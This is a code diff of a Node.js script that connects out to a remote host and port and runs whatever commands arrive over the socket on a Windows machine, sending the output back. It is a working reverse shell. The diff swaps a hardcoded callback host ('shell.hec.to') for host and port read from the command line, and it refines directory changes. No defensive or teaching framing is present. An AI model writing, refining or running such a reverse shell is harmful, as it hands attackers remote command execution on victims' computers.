@@ -1,18 +1,21 @@
 const net = require('net')
-const child_process = require('child_process');
-var iconv = require('iconv-lite');
+const child_process = require('child_process')
+const iconv = require('iconv-lite')
+const fs = require('fs')
 
 const server = net.createServer()
 
-const SERVER_PORT = 8857
-const CLIENT_PORT = 8858
-const HOST = "shell.hec.to"
-
 let cwd = 'C:\\'
+
+let [prog, file, HOST, PORT] = process.argv
+PORT = parseInt(PORT, 10)
 
 function spawn(executable, args, cwd, onstdout, onstderr) {
     return new Promise((resolve, reject) => {
         try {
+            if (cwd !== undefined && !fs.existsSync(cwd)) {
+                cwd = undefined
+            }
             let proc = child_process.spawn(executable, args, {cwd,shell:true})
             proc.stdout.on('data', onstdout)
             proc.stderr.on('data', onstderr)
@@ -58,8 +61,6 @@ function space_join(args) {
     return res.join(" ")
 }
 
-
-
 function split_args(command) {
     let [executable, ...args] = space_split(command)
     if (['dir', 'echo', 'set'].indexOf(executable) > -1) {
@@ -72,14 +73,19 @@ function split_args(command) {
 function execute() {
     return new Promise((resolve, reject) => {
         var client = new net.Socket()
-        client.connect(SERVER_PORT, HOST, ()=>{
-            
+        client.connect(PORT, HOST, ()=>{
+            console.log(`connected to ${HOST} ${PORT}`)
         })
         client.on('data', (data) => {
             let command = data.toString()
             let [executable, args] = split_args(command)
             if (executable == 'cd') {
-                cwd = args.join(' ')
+                let cwd_ = args[0]
+                if (fs.existsSync(cwd_) && fs.statSync(cwd_).isDirectory()) {
+                    cwd = cwd_
+                } else {
+                    client.write(`no such directory ${cwd_}\n`)
+                }
                 executable = 'cmd'
                 args = ["/c", "echo %CD%"]
             }
@@ -88,9 +94,10 @@ function execute() {
             }
             //console.log('args', args)
 
-            let buffers = []
+            //let buffers = []
 
-            console.log("executable, args, cwd", executable, args, cwd)
+            console.log({executable, args, cwd})
+
             spawn(executable, args, cwd, (data) => {
                 //client.write(iconv.decode(data, 'cp866'))
                 //buffers.push(data)
@@ -117,8 +124,6 @@ function execute() {
         })
     })
 }
-
-
 
 console.log('server');
 
